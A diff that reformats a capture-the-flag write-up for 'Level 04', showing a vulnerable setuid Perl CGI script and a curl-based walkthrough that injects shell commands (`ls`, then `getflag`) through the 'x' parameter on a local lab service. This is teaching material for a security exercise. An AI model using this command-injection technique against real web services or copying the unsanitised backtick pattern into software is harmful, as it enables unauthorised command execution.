@@ -1,14 +1,30 @@
-▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
-▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
-▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌   ▐▓▌
+# Level 04
 
-=======
+**Exploit:** OS command injection in Perl CGI
+
+The CGI script inserts the `x` parameter into a shell command, allowing shell syntax to execute another command.
+
+## Walkthrough
+
+The script reads parameter `x` and passes its value to `echo` through the shell. Inspect the script:
+
+```bash
 file level04.pl
-level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
+```
 
-cat level04.pl 
+Output:
+
+```text
+level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
+```
+
+```bash
+cat level04.pl
+```
+
+Output:
+
+```perl
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
@@ -18,25 +34,34 @@ sub x {
   print `echo $y 2>&1`;
 }
 x(param("x"));
+```
 
-x(param("x")) calls the subroutine with the content of param "x"
-https://google.com/?param=bonjour
-param("param)=bonjour
+The call `x(param("x"))` passes the request's `x` parameter to the subroutine. The backtick expression runs `echo` through a shell, making the parameter vulnerable to command injection.
 
-The following line is the exploit :  print `echo $y 2>&1`;
-It allows us to execute a command during interpretation.
-
-First let's try the script:
+Check that the local service responds:
+```bash
 curl -I http://localhost:4747
+```
+
+Output:
+
+```text
 HTTP/1.1 200 OK
 Date: Tue, 13 Oct 2026 12:20:17 GMT
 Server: Apache/2.2.22 (Ubuntu)
 Vary: Accept-Encoding
 Content-Length: 1
 Content-Type: text/html
+```
 
-Ok it works and now can we add params ?
-curl -v http://localhost:4747/?x=`ls`
+Pass `ls` as the parameter value:
+```bash
+curl -v 'http://localhost:4747/?x=`ls`'
+```
+
+Output:
+
+```text
 * About to connect() to localhost port 4747 (#0)
 *   Trying 127.0.0.1... connected
 > GET /?x=level04.pl HTTP/1.1
@@ -54,9 +79,13 @@ curl -v http://localhost:4747/?x=`ls`
 level04.pl
 * Connection #0 to host localhost left intact
 * Closing connection #0
+```
 
 
-Ok it works so now we know that we can inject the getflag inside this and it will get executed
+The response contains the output of `ls`, confirming that the parameter is interpreted by the shell. Replace `ls` with `getflag`:
 
+```bash
 curl -v 'http://localhost:4747/?x=`getflag`'
-and we get the flag!
+```
+
+The response contains the flag.
